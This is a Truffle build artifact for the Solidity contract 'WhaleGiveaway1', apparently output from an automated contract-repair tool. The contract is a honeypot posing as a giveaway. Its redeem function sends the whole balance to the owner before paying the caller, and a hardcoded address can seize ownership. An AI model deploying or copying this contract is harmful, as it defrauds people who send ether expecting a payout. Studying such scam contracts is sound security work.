{
  "contractName": "WhaleGiveaway1",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "minEligibility",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "Owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "redeem",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "adr",
          "type": "address"
        },
        {
          "name": "data",
          "type": "bytes"
        }
      ],
      "name": "Command",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561005057600080fd5b50610540806100606000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633ccfd60b1461006f578063495c958814610079578063b4a99a4e146100a4578063ba21d62a146100fb578063be040fb014610177575b005b610077610181565b005b34801561008557600080fd5b5061008e6102fa565b6040518082815260200191505060405180910390f35b3480156100b057600080fd5b506100b9610306565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610175600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061032b565b005b61017f610423565b005b737a617c2b05d2a74ff9babc9d81e5225c1e01004b73ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561021e57737a617c2b05d2a74ff9babc9d81e5225c1e01004b6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561027957600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102f7573d6000803e3d6000fd5b50565b670ddd2a1dd742900081565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561038857600080fd5b8273ffffffffffffffffffffffffffffffffffffffff16348360405180828051906020019080838360005b838110156103ce5780820151818401526020810190506103b3565b50505050905090810190601f1680156103fb5780820380516001836020036101000a031916815260200191505b5091505060006040518083038185875af192505050905080151561041e57600080fd5b505050565b670ddd2a1dd742900034101515610512576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156104b2573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610510573d6000803e3d6000fd5b505b5600a165627a7a72305820e871a740d767f53cc1f0900be28abbced0f6b02128127b557c39d2b3d3a4798e0029",
  "source": "pragma solidity ^0.4.19;\n\ncontract sGuardPlus {\n    constructor() internal {}\n}\n\ncontract WhaleGiveaway1 {\n    address public Owner = msg.sender;\n    uint256 public constant minEligibility = 0.999001 ether;\n\n    function() public payable {}\n\n    function redeem() public payable {\n        if (msg.value >= minEligibility) {\n            Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function withdraw() public payable {\n        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {\n            Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;\n        }\n\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address adr, bytes data) public payable {\n        require(msg.sender == Owner);\n        bool __sent_result100 = adr.call.value(msg.value)(data);\n        require(__sent_result100);\n    }\n}\n",
  "sourcePath": "/workdir/truffle_example/after/0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37/contracts/0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37.sol.fixed.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.8",
  "updatedAt": "2022-08-13T03:08:10.541Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}